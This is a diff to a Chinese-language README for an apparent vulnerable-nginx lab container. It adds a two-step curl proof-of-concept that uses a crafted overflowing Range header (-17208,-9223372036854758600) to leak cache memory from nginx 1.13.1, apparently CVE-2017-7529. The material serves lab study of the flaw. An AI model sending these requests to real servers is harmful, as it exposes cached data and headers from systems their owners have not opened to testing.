@@ -18,7 +18,35 @@ $ docker run -d -p 8000:80 medicean/vulapps:n_nginx_1
 
 ### 使用与利用
 
-补充中
+#### POC
+
+1. 访问缓存文件拿到 Content-Length，以 /proxy/demo.png 为例：
+
+```
+$ curl -I http://127.0.0.1:8000/proxy/demo.png
+
+HTTP/1.1 200 OK
+Server: nginx/1.13.1
+Date: Wed, 12 Jul 2017 15:57:57 GMT
+Content-Type: image/png
+Content-Length: 16585
+Connection: keep-alive
+Last-Modified: Wed, 12 Jul 2017 15:57:57 GMT
+ETag: W/"40c9-5543e4fad0d40"
+X-Proxy-Cache:: MISS
+Accept-Ranges: bytes
+```
+看到 `Content-Length: 16585`, 找个比这个数大的值，例如 17208, 第二个 range 值为 0x8000000000000000-17208, 也就是 9223372036854758600
+
+2. 请求时设置 range 如下：
+
+```
+$ curl -i http://127.0.0.1:8000/proxy/demo.png -r -17208,-9223372036854758600
+```
+
+看到结果：
+
+![](./poc.png)
 
 ### 参考链接
 
